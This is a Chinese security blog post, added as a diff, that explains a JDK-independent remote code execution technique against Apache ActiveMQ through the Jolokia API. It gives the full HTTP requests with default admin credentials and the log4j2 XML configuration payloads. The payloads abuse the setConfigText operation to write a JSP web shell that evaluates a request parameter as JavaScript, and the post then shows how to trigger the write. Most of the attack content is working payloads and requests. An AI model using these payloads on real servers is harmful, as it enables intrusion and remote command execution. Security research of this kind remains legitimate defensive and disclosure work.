@@ -1,0 +1,294 @@
+<hr>
+<p>title: Apache ActiveMQ Jolokia远程代码执行不依赖JDK打法<br>categories: Java<br>tags:</p>
+<ul>
+<li>Java</li>
+<li>代码审计<br>Author: Y4tacker<br>password:<br>abstract: ‘有东西被加密了, 请输入密码查看.’<br>message: ‘您好, 这里需要密码.’<br>wrong_pass_message: ‘抱歉, 这个密码看着不太对, 请再试试.’<br>wrong_hash_message: ‘抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.’<br>theme: xray<br>date: 2023-11-30 20:20:15</li>
+</ul>
+<hr>
+<h1 id="Apache-ActiveMQ-Jolokia远程代码执行不依赖JDK打法"><a href="#Apache-ActiveMQ-Jolokia远程代码执行不依赖JDK打法" class="headerlink" title="Apache ActiveMQ Jolokia远程代码执行不依赖JDK打法"></a>Apache ActiveMQ Jolokia远程代码执行不依赖JDK打法</h1><p>想着最近连写了几篇加密博客有点对不起看我博客的粉丝了，今天抽空简单分享一个姿势</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>大概测了一下</p>
+<p>Apache ActiveMQ 5.16.x系列无log4j2的mbean</p>
+<p>Apache ActiveMQ 5.17.x系列漏洞版本受影响</p>
+<h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>从网上已公开的打法可以知道使用<code>jdk.management.jfr:type=FlightRecorder</code>受jdk版本的影响，那有没有其他方法呢？答案肯定是有，从<a href="https://github.com/apache/activemq/commit/6120169e5">commit点我</a>可以看出禁用的mbean不仅有<code>jdk.management.jfr:type=FlightRecorder</code>,还有<code>com.sun.management:type=DiagnosticCommand</code>以及<code>org.apache.logging.log4j2:*</code>,对于DiagnosticCommand的利用在之前很早就有公开，链接在<a href="https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/file-write-to-rce-vhost-jfr.md%EF%BC%8C%E4%B8%8D%E8%BF%87%E5%A4%A7%E6%A6%82%E7%9C%8B%E4%BA%86%E4%B8%80%E4%B8%8B%E8%BF%99%E9%87%8C%E4%BC%BC%E4%B9%8E%E4%B8%8D%E5%A4%AA%E8%A1%8C(%E4%B9%9F%E6%B2%A1%E4%BB%94%E7%BB%86%E7%9C%8B%E5%B0%B1%E6%98%AF%E4%BA%86)%EF%BC%8C%E6%AF%94%E8%BE%83%E6%84%9F%E5%85%B4%E8%B6%A3%E7%9A%84%E6%98%AF%E8%BF%99%E4%B8%AAlog4j2%E7%9A%84%E5%88%A9%E7%94%A8">https://github.com/laluka/jolokia-exploitation-toolkit/blob/main/exploits/file-write-to-rce-vhost-jfr.md，不过大概看了一下这里似乎不太行(也没仔细看就是了)，比较感兴趣的是这个log4j2的利用</a></p>
+<p>在<a href="http://127.0.0.1:8161/api/jolokia/list%E5%BD%93%E4%B8%AD%E6%90%9C%E7%B4%A2%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%A6%82%E4%B8%8B%EF%BC%8C%E5%88%A9%E7%94%A8%E7%9A%84%E6%97%B6%E5%80%99%60type=63a65a25%60%E4%BC%BC%E4%B9%8E%E4%B8%8D%E6%98%AF%E5%9B%BA%E5%AE%9A%E7%9A%84%EF%BC%8C%E7%9C%8B%E8%B5%B7%E6%9D%A5%E5%A4%A7%E6%A6%82%E5%92%8C%E7%89%88%E6%9C%AC%E6%9C%89%E5%85%B3%EF%BC%8C%E9%9C%80%E8%A6%81%E5%85%88%E8%AE%BF%E9%97%AE%E8%BF%99%E4%B8%AA%E8%B7%AF%E7%94%B1%E7%9C%8B%E7%9C%8B">http://127.0.0.1:8161/api/jolokia/list当中搜索可以看到如下，利用的时候`type=63a65a25`似乎不是固定的，看起来大概和版本有关，需要先访问这个路由看看</a></p>
+<pre><code class="json">&quot;org.apache.logging.log4j2&quot;: {
+            &quot;component=StatusLogger,type=63a65a25&quot;: {
+                &quot;attr&quot;: {
+                    &quot;StatusDataHistory&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;[Ljava.lang.String;&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;Level&quot;: {
+                        &quot;rw&quot;: true,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;StatusData&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.util.List&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;ObjectName&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;javax.management.ObjectName&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;ContextName&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    }
+                },
+                &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.StatusLoggerAdmin&quot;,
+                &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot;
+            },
+            &quot;component=Loggers,name=,type=63a65a25&quot;: {
+                &quot;attr&quot;: {
+                    &quot;Additive&quot;: {
+                        &quot;rw&quot;: true,
+                        &quot;type&quot;: &quot;boolean&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;Filter&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;AppenderRefs&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;[Ljava.lang.String;&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;IncludeLocation&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;boolean&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;Level&quot;: {
+                        &quot;rw&quot;: true,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;Name&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    }
+                },
+                &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.LoggerConfigAdmin&quot;,
+                &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot;
+            },
+            &quot;type=63a65a25&quot;: {
+                &quot;op&quot;: {
+                    &quot;setConfigText&quot;: {
+                        &quot;args&quot;: [{
+                            &quot;name&quot;: &quot;p1&quot;,
+                            &quot;type&quot;: &quot;java.lang.String&quot;,
+                            &quot;desc&quot;: &quot;&quot;
+                        }, {
+                            &quot;name&quot;: &quot;p2&quot;,
+                            &quot;type&quot;: &quot;java.lang.String&quot;,
+                            &quot;desc&quot;: &quot;&quot;
+                        }],
+                        &quot;ret&quot;: &quot;void&quot;,
+                        &quot;desc&quot;: &quot;Operation exposed for management&quot;
+                    },
+                    &quot;getConfigText&quot;: {
+                        &quot;args&quot;: [{
+                            &quot;name&quot;: &quot;p1&quot;,
+                            &quot;type&quot;: &quot;java.lang.String&quot;,
+                            &quot;desc&quot;: &quot;&quot;
+                        }],
+                        &quot;ret&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Operation exposed for management&quot;
+                    }
+                },
+                &quot;attr&quot;: {
+                    &quot;Status&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;ConfigClassName&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;ConfigLocationUri&quot;: {
+                        &quot;rw&quot;: true,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;ConfigName&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;ConfigProperties&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.util.Map&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;ConfigText&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;Name&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;ObjectName&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;javax.management.ObjectName&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    },
+                    &quot;ConfigFilter&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    }
+                },
+                &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.LoggerContextAdmin&quot;,
+                &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot;
+            },
+            &quot;component=ContextSelector,type=63a65a25&quot;: {
+                &quot;attr&quot;: {
+                    &quot;ImplementationClassName&quot;: {
+                        &quot;rw&quot;: false,
+                        &quot;type&quot;: &quot;java.lang.String&quot;,
+                        &quot;desc&quot;: &quot;Attribute exposed for management&quot;
+                    }
+                },
+                &quot;class&quot;: &quot;org.apache.logging.log4j.core.jmx.ContextSelectorAdmin&quot;,
+                &quot;desc&quot;: &quot;Information on the management interface of the MBean&quot;
+            },
+</code></pre>
+<p>在这里可以看到两个比较可疑的操作<code>setConfigText</code>与<code>getConfigText</code>,看起来似乎与配置相关</p>
+<p>看看代码可以发现，确实根据我们传入的字符串做了配置文件解析更新</p>
+<p><img src="./Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image-20231130203410738.png" alt="image-20231130203410738"></p>
+<p>同时<code>getConfigText</code>可以查看当前环境下的配置，可以看到返回的形式就和文件<code>/conf/log4j2.properties</code>一致</p>
+<pre><code class="java">POST /api/jolokia/ HTTP/1.1
+Host: 127.0.0.1:8161
+Authorization: Basic YWRtaW46YWRtaW4=
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
+Origin: 127.0.0.1
+Connection: close
+Content-Type: application/json
+Content-Length: 2174
+
+{
+ &quot;type&quot;: &quot;EXEC&quot;,
+ &quot;mbean&quot;: &quot;org.apache.logging.log4j2:type=63a65a25&quot;,
+ &quot;operation&quot;: &quot;getConfigText&quot;,
+ &quot;arguments&quot;:[&quot;UTF-8&quot;]
+ }
+
+response:
+
+{&quot;request&quot;:{&quot;mbean&quot;:&quot;org.apache.logging.log4j2:type=63a65a25&quot;,&quot;arguments&quot;:[&quot;UTF-8&quot;],&quot;type&quot;:&quot;exec&quot;,&quot;operation&quot;:&quot;getConfigText&quot;},&quot;value&quot;:&quot;rootLogger.level=INFO\nrootLogger.appenderRef.console.ref=Console\nrootLogger.appenderRef.console.filter.threshold.type=ThresholdFilter\nrootLogger.appenderRef.console.filter.threshold.level=INFO\nrootLogger.appenderRef.logfile.ref=RollingFile\nlogger.spring.name=org.apache.activemq.spring\nlogger.spring.level=WARN\nlogger.web.name=org.apache.activemq.web.handler\nlogger.web.level=WARN\nlogger.springframework.name=org.springframework\nlogger.springframework.level=WARN\nlogger.xbean.name=org.apache.xbean\nlogger.xbean.level=WARN\n\n# Jetty\nlogger.jetty.name=org.eclipse.jetty\nlogger.jetty.level=WARN\n\n# ActiveMQ\n#log4j2.logger.activemq.name=org.apache.activemq\n#log4j2.logger.activemq.level=DEBUG\n\n# Appender configuration\n\n# Console appender\nappender.console.type=Console\nappender.console.name=Console\nappender.console.layout.type=PatternLayout\nappender.console.layout.pattern=%5p | %m%n\n\n# File appender\nappender.logfile.type=RollingRandomAccessFile\nappender.logfile.name=RollingFile\nappender.logfile.fileName=${sys:activemq.data}\/activemq2.log\nappender.logfile.filePattern=${sys:activemq.data}\/activemq2.log.%i\nappender.logfile.append=true\nappender.logfile.layout.type=PatternLayout\nappender.logfile.layout.pattern=%d | %-5p | %m | %c | %t%n%throwable{full}\nappender.logfile.policies.type=Policies\nappender.logfile.policies.size.type=SizeBasedTriggeringPolicy\nappender.logfile.policies.size.size=1MB\n\n\nlogger.audit.name=org.apache.activemq.audit\nlogger.audit.additivity=false\nlogger.audit.level=INFO\nlogger.audit.appenderRef.auditlog.ref=AuditLog\n\nappender.auditlog.type=RollingRandomAccessFile\nappender.auditlog.name=AuditLog\nappender.auditlog.fileName=${sys:activemq.data}\/audit.log\nappender.auditlog.filePattern=${sys:activemq.data}\/audit.log.%i\nappender.auditlog.append=true\nappender.auditlog.layout.type=PatternLayout\nappender.auditlog.layout.pattern=%-5p | %m | %t%n\nappender.auditlog.policies.type=Policies\nappender.auditlog.policies.size.type=SizeBasedTriggeringPolicy\nappender.auditlog.policies.size.size=1MB\n&quot;,&quot;timestamp&quot;:1701347796,&quot;status&quot;:200}
+</code></pre>
+<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><p>但是当我们按照这个格式改好payload调用set更新时发现并没有成功，无事发生</p>
+<p>调试后才发现这个config解析其实是xml形式的，算是被系统坑了一把</p>
+<p><img src="./Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image-20231130204226465.png" alt="image-20231130204226465"></p>
+<p>调用栈(方便也想调试看看的师傅)</p>
+<pre><code class="java">setConfiguration:601, LoggerContext (org.apache.logging.log4j.core)
+start:285, LoggerContext (org.apache.logging.log4j.core)
+setConfigText:201, LoggerContextAdmin (org.apache.logging.log4j.core.jmx)
+invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
+invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)
+invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
+invoke:566, Method (java.lang.reflect)
+invoke:71, Trampoline (sun.reflect.misc)
+invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)
+invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)
+invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)
+invoke:566, Method (java.lang.reflect)
+invoke:260, MethodUtil (sun.reflect.misc)
+invokeM2:112, StandardMBeanIntrospector (com.sun.jmx.mbeanserver)
+invokeM2:46, StandardMBeanIntrospector (com.sun.jmx.mbeanserver)
+invokeM:237, MBeanIntrospector (com.sun.jmx.mbeanserver)
+invoke:138, PerInterface (com.sun.jmx.mbeanserver)
+invoke:252, MBeanSupport (com.sun.jmx.mbeanserver)
+invoke:809, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)
+invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver)
+</code></pre>
+<h2 id="破局"><a href="#破局" class="headerlink" title="破局"></a>破局</h2><p>但是也知道我懒，这种格式转换的活我很烦，还好有chatGPT，简单问了一手解决了我的问题</p>
+<p>毕竟我不关心内容只需要一个模板罢了</p>
+<pre><code class="xml">把接下来我给的配置转化为log4j2配置的xml的形式
+好的喵
+xxxx
+以下是将您提供的配置转换为log4j2的XML形式：
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;Configuration status=&quot;WARN&quot;&gt;
+    &lt;Appenders&gt;
+        &lt;Console name=&quot;Console&quot; target=&quot;SYSTEM_OUT&quot;&gt;
+            &lt;PatternLayout pattern=&quot;%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n&quot;/&gt;
+        &lt;/Console&gt;
+        &lt;File name=&quot;File&quot; fileName=&quot;logs/logfile.log&quot;&gt;
+            &lt;PatternLayout pattern=&quot;%d{yyyy-MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg%n&quot;/&gt;
+        &lt;/File&gt;
+    &lt;/Appenders&gt;
+    &lt;Loggers&gt;
+        &lt;Root level=&quot;debug&quot;&gt;
+            &lt;AppenderRef ref=&quot;Console&quot;/&gt;
+            &lt;AppenderRef ref=&quot;File&quot;/&gt;
+        &lt;/Root&gt;
+    &lt;/Loggers&gt;
+&lt;/Configuration&gt;
+</code></pre>
+<p>虽然不知道绝对路径，但是根据系统的原配置文件的写法<code>appender.logfile.fileName=${sys:activemq.data}/activemq.log</code>再结合日志路径可以猜到使用<code>${sys:activemq.data}/../webapps/admin/</code></p>
+<p>同时为了方便利用，我写成el表达式的形式</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;Configuration status=&quot;WARN&quot;&gt;
+    &lt;Appenders&gt;
+        &lt;RollingRandomAccessFile name=&quot;RollingFile&quot; fileName=&quot;${sys:activemq.data}/../webapps/admin/y4test.jsp&quot;
+                                 filePattern=&quot;${sys:activemq.data}/../webapps/admin/y4test.jsp&quot;&gt;
+            &lt;PatternLayout pattern=&quot;${&#39;&#39;[&#39;getClass&#39;]()[&#39;forName&#39;](&#39;javax.script.ScriptEngineManager&#39;)[&#39;newInstance&#39;]()[&#39;getEngineByName&#39;](&#39;JavaScript&#39;)[&#39;eval&#39;](param.a)}&quot;/&gt;
+            &lt;Policies&gt;
+                &lt;SizeBasedTriggeringPolicy size=&quot;1MB&quot;/&gt;
+            &lt;/Policies&gt;
+        &lt;/RollingRandomAccessFile&gt;
+    &lt;/Appenders&gt;
+    &lt;Loggers&gt;
+        &lt;Root level=&quot;INFO&quot;&gt;
+            &lt;AppenderRef ref=&quot;RollingFile&quot;/&gt;
+        &lt;/Root&gt;
+    &lt;/Loggers&gt;
+&lt;/Configuration&gt;
+</code></pre>
+<p>打一发看看，但是目录下只生成了文件并没有把payload写入，因此我们需要找一个能触发日志的功能点</p>
+<p>这里我随便找了一个<code>/admin/deleteDestination.action</code></p>
+<p>看到这个心满意足</p>
+<p><img src="./Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image.png" alt="image"></p>
+<p>但是忘了一点，这里虽然输出了payload，也能利用了但是对于我们极客来说，不喜欢除了payload的其他字符</p>
+<p><img src="./Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image-1349924.png" alt="image"></p>
+<p>能做到吗？当然可以，通过查阅手册可以发现针对堆栈信息，有下面配置</p>
+<pre><code class="xml">%throwable{full}：输出完整的异常堆栈信息
+%ex{none}来禁用异常堆栈的输出
+%ex{short}：输出简短的异常堆栈信息，只包括异常类和消息。
+%ex{full}：输出完整的异常堆栈信息，包括异常类、消息和详细的堆栈跟踪。
+</code></pre>
+<p>那么必然是选<code>%ex{none}</code>，得到如下payload</p>
+<pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;Configuration status=&quot;WARN&quot;&gt;
+    &lt;Appenders&gt;
+        &lt;RollingRandomAccessFile name=&quot;RollingFile&quot; fileName=&quot;${sys:activemq.data}/../webapps/admin/y4test.jsp&quot;
+                                 filePattern=&quot;${sys:activemq.data}/../webapps/admin/y4test.jsp&quot;&gt;
+            &lt;PatternLayout pattern=&quot;${&#39;&#39;[&#39;getClass&#39;]()[&#39;forName&#39;](&#39;javax.script.ScriptEngineManager&#39;)[&#39;newInstance&#39;]()[&#39;getEngineByName&#39;](&#39;JavaScript&#39;)[&#39;eval&#39;](param.a)}%ex{none}&quot;/&gt;
+            &lt;Policies&gt;
+                &lt;SizeBasedTriggeringPolicy size=&quot;1MB&quot;/&gt;
+            &lt;/Policies&gt;
+        &lt;/RollingRandomAccessFile&gt;
+    &lt;/Appenders&gt;
+    &lt;Loggers&gt;
+        &lt;Root level=&quot;INFO&quot;&gt;
+            &lt;AppenderRef ref=&quot;RollingFile&quot;/&gt;
+        &lt;/Root&gt;
+    &lt;/Loggers&gt;
+&lt;/Configuration&gt;
+</code></pre>
+<p>再一次利用一发，就是这么舒爽2333，利用也简单只需要一发修改配置、触发文件写入</p>
+<p><img src="./Apache-ActiveMQ-Jolokia%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8D%E4%BE%9D%E8%B5%96JDK%E6%89%93%E6%B3%95/image-1350467.png" alt="image"></p>
